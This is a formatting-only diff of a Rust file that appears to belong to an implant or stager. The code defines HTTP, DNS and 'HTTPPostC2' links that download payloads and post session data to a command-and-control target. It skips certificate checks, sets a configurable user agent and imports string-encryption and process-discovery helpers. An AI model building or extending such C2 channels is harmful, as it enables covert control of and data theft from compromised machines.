@@ -1,24 +1,24 @@
 use crate::config::Config;
 use crate::dataoperation::{apply_all_dataoperations, DataOperation, UnApplyDataOperation};
-use crate::poollink::Advanced;
-use crate::link_util::get_domain_name;
 use crate::link_util::bytes_to_gigabytes_string;
 use crate::link_util::cmdline;
+use crate::link_util::get_domain_name;
 use crate::link_util::process_name_and_parent;
 use crate::link_util::process_path;
 use crate::link_util::working_dir;
 use crate::payload::Payload;
+use crate::poollink::Advanced;
 
-use serde::{Deserialize, Serialize};
 use anyhow::bail;
 use anyhow::Result;
 use rand::Rng;
-use std::io::Read;
-use std::{thread, time};
-use std::fs;
-use std::time::Duration;
-use std::process;
 use ring::signature::{self, KeyPair};
+use serde::{Deserialize, Serialize};
+use std::fs;
+use std::io::Read;
+use std::process;
+use std::time::Duration;
+use std::{thread, time};
 use sysinfo::System;
 //use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
 use attohttpc::header;
@@ -26,7 +26,6 @@ use attohttpc::header;
 use cryptify::encrypt_string;
 use log::debug;
 use log::info;
-
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub enum Link {
@@ -191,7 +190,6 @@ pub trait LinkFetch {
         let data = self.download_data_post(session_id, running_thread, config)?;
         self.un_apply_all_dataoperations(data)
     }
-
 }
 
 impl LinkFetch for Link {
@@ -204,7 +202,7 @@ impl LinkFetch for Link {
             Link::HTTPPostC2(link) => link.download_data(config),
         }
     }
-    
+
     //TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/
     fn download_data_post(
         &self,
@@ -407,8 +405,7 @@ impl LinkFetch for DNSLink {
 
 impl LinkFetch for HTTPLink {
     fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
-        let build: attohttpc::RequestBuilder =
-        attohttpc::get(&self.get_target())
+        let build: attohttpc::RequestBuilder = attohttpc::get(&self.get_target())
             .danger_accept_invalid_certs(true)
             .header(header::USER_AGENT, &config.link_user_agent)
             .timeout(Duration::from_secs(config.link_timeout));
@@ -533,7 +530,7 @@ impl LinkFetch for HTTPPostC2Link {
         let m: Vec<u8> =
             apply_all_dataoperations(&mut self.dataoperation_post.clone(), post_data_bytes)?;
 
-        /* 
+        /*
         let client = reqwest::blocking::Client::builder()
             .danger_accept_invalid_certs(true)
             .timeout(Duration::from_secs(config.link_timeout))
@@ -547,8 +544,7 @@ impl LinkFetch for HTTPPostC2Link {
         Ok(body)
         */
 
-        let build =
-        attohttpc::post(&self.get_target())
+        let build = attohttpc::post(&self.get_target())
             .danger_accept_invalid_certs(true)
             .header(header::USER_AGENT, &config.link_user_agent)
             .timeout(Duration::from_secs(config.link_timeout))
@@ -557,7 +553,6 @@ impl LinkFetch for HTTPPostC2Link {
         let mut body: Vec<u8> = Vec::new();
         response.read_to_end(&mut body)?;
         Ok(body)
-
     }
 
     fn get_target(&self) -> String {
